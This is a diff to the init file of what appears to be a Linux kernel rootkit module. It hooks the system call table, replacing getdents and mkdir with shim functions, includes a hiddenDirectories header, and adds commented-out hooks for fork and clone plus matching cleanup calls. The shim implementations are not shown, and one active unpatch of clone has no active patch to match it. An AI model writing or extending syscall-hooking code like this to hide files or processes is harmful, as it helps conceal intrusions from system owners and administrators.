@@ -3,12 +3,13 @@
 #include "syscall.h"
 #include "utility.h"
 #include "hiddenDirectories.h"
+#include "bootprocess.h"
 
 //new system calls
 #include "getdentsShim.h"
 #include "readShim.h"
 #include "mkdirShim.h"
-#include "bootprocess.h"
+#include "forkShim.h"
 
 MODULE_LICENSE("GPL");
 
@@ -39,6 +40,8 @@ int init_module() {
 	patch(SYS_getdents, getdentsShim);
 	//patch(SYS_read, readShim);
 	patch(SYS_mkdir, mkdirShim);
+	//patch(SYS_fork, forkShim);
+	//patch(SYS_clone, cloneShim);
 
 	printk(KERN_INFO "Module loaded\n");
 	return 0;
@@ -49,6 +52,8 @@ void cleanup_module() {
 	//The API can be called to deactivate the module.
 
 	//restore the system call table, in reverse order
+	unpatch(SYS_clone);
+	//unpatch(SYS_fork);
 	unpatch(SYS_mkdir);
 	unpatch(SYS_read);
 	unpatch(SYS_getdents);
